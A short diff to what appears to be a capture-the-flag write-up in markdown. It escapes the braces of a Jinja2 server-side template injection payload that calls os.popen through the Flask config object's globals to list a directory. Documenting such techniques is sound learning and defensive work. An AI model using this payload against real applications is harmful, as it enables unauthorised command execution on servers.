@@ -88,6 +88,6 @@ _So what's next?_
 
 I've used 
 ```
-{{config.__class__.__init__.__globals__['os'].popen('la -al').read()}}
+\{{ config.__class__.__init__.__globals__['os'].popen('la -al').read() \}}
 ```
 to list the content of the current direcory.
